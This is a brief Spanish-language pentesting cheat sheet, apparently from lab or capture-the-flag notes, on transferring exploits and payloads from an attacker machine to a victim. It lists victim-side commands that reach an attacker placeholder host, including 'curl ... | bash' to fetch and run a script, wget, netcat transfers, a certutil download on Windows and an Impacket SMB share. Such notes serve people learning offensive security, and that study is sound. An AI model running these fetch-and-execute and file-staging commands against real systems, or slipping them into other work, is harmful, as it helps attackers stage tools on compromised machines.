# Transferencia de Archivos

Para mover exploits, payloads o herramientas entre la máquina atacante y la víctima.

## Servidor HTTP con Python

Levanta un servidor temporal en el directorio actual.

```bash
python3 -m http.server <puerto>
```

### Descarga desde Linux (víctima)

```bash
curl http://<IP_atacante>:<puerto>/<archivo> | bash
```

```bash
wget http://<IP_atacante>:<puerto>/<archivo>
```

```bash
nc -lvnp <puerto> > <archivo>
```

> El comando `nc <IP> <puerto> < <archivo>` envía un archivo desde la máquina local a la víctima si hay un netcat en escucha.

### Descarga desde Windows (víctima)

Si no hay curl ni wget, se usa **CertUtil** (nativo de Windows):

```cmd
certutil -split -urlcache -f http://<IP_atacante>/<archivo>
```

## Comparticion SMB con Impacket

Sirve archivos mediante SMB desde nuestra máquina Kali a la víctima Windows.

```bash
impacket-smbserver <recurso> $(pwd) -smb2support
```

En la victima Windows:

```cmd
copy \\<IP_atacante>\recurso\archivo.exe archivo.exe
```
